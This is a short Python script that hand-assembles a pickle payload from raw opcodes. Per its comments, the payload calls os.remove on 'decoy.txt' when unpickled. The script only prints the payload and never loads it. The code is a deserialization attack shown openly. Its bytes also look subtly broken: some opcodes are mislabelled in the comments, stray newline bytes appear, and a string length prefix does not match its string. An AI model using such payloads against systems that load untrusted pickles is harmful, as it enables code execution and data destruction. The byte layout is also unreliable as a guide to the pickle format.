import pickle
import pickletools

# Build pickle payload manually using opcodes
# This creates: os.remove('decoy.txt')
payload = (
    b'\x80\x04\x95'  # Protocol 4 header
    b'(\x00\x00\x00'  # Frame size
    b'\x8c\x05posix'  # GLOBAL 'posix'
    b'\n\x8c\x06remove'  # GLOBAL 'remove'
    b'\n\x93'  # STACK_GLOBAL (combine to os.remove)
    b'\x8c\ndecoy.txt'  # SHORT_BINUNICODE 'decoy.txt'
    b'\x85'  # TUPLE1
    b'R'  # REDUCE (call os.remove('decoy.txt'))
    b'.'  # STOP
)

print(f"Payload hex: {payload.hex()}")
print(f"Payload length: {len(payload)} bytes")

